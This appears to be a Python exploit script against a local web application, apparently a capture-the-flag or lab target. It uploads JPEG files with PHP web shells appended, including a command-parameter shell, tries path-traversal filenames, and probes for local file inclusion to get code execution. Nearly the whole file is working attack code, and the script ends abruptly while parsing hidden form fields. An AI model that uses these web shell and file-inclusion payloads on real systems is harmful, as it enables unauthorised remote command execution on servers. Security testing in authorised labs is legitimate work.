import requests
import re

base_url = "http://127.0.0.1:33021"

# Create minimal valid JPEG
def create_minimal_jpeg():
    jpeg = b'\xff\xd8'
    jpeg += b'\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    jpeg += b'\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t'
    jpeg += b'\x08\x0a\x0c\x14\x0d\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a'
    jpeg += b'\x1f\x1e\x1d\x1a\x1c\x1c $.\x28 #\x17\x1c,),.444444)\x22\x22\x22'
    jpeg += b'\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00'
    jpeg += b'\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00'
    jpeg += b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b'
    jpeg += b'\xff\xda\x00\x08\x01\x01\x00\x00?\x00'
    jpeg += b'\x7f\xd4\xb5\xa8\x88'
    jpeg += b'\xff\xd9'
    return jpeg

jpeg_content = create_minimal_jpeg()

# Test 1: Path traversal in filename
print("[*] TEST 1: Path traversal in filename")
paths = ['../shell.jpg', '../../shell.jpg', '..%2Fshell.jpg', '....//shell.jpg']
for path in paths:
    shell = jpeg_content + b'<?php system("id"); ?>'
    files = {'userfile': (path, shell, 'image/jpeg')}
    response = requests.post(f"{base_url}/index.php", files=files)
    print(f"[+] Path '{path}': {response.status_code}")
    # Check for uploaded file in various locations
    checks = [
        f"{base_url}/upload/shell.jpg",
        f"{base_url}/shell.jpg",
        f"{base_url}/upload/../shell.jpg"
    ]
    for check_url in checks:
        r = requests.get(check_url)
        if r.status_code == 200 and 'uid=' in r.text:
            print(f"[!] EXECUTION FOUND at {check_url}")

# Test 2: Check if index.php includes any uploaded files
print("\n[*] TEST 2: Check if index.php processes uploads")
response = requests.get(f"{base_url}/index.php")
print(f"[+] index.php content:\n{response.text}")

# Test 3: Check for PHP file include via parameter
print("\n[*] TEST 3: Try parameter-based file inclusion")
# Upload a shell
shell_jpg = jpeg_content + b'<?php system($_GET["cmd"]); ?>'
files = {'userfile': ('shell.jpg', shell_jpg, 'image/jpeg')}
requests.post(f"{base_url}/index.php", files=files)

# Try various inclusion parameters
params_to_test = [
    {'file': 'upload/shell.jpg'},
    {'page': 'upload/shell.jpg'},
    {'include': 'upload/shell.jpg'},
    {'img': 'upload/shell.jpg'},
    {'image': 'upload/shell.jpg'},
    {'path': 'upload/shell.jpg'},
]

for params in params_to_test:
    params['cmd'] = 'id'
    r = requests.get(f"{base_url}/index.php", params=params)
    if 'uid=' in r.text:
        print(f"[!] LFI FOUND with params: {params}")
        print(f"[+] Response: {r.text}")

# Test 4: Check for image processing functions that might execute PHP
print("\n[*] TEST 4: Test image resize/process endpoint")
# Try action parameter
for action in ['resize', 'crop', 'rotate', 'process', 'view', 'display']:
    r = requests.get(f"{base_url}/index.php", params={'action': action, 'file': 'upload/shell.jpg', 'cmd': 'id'})
    if 'uid=' in r.text:
        print(f"[!] EXECUTION with action={action}")

# Test 5: Look for the upload form action
print("\n[*] TEST 5: Analyze form action")
# Check if there's a hidden field or specific upload handler
r = requests.get(f"{base_url}/index.php")
forms = re.findall(r'<form[^>]*action=["\']?([^"\'>\s]+)', r.text, re.I)
print(f"[+] Form actions found: {forms}")

hidden_fields = re.findall(r'<input[^>]*type=["\']?hidden["\']?[^>]*name=["\']?([^"\'>\s]+)["\']?[^>]*value=["\']?([^"\'>\s]+)', r.text, re.I)
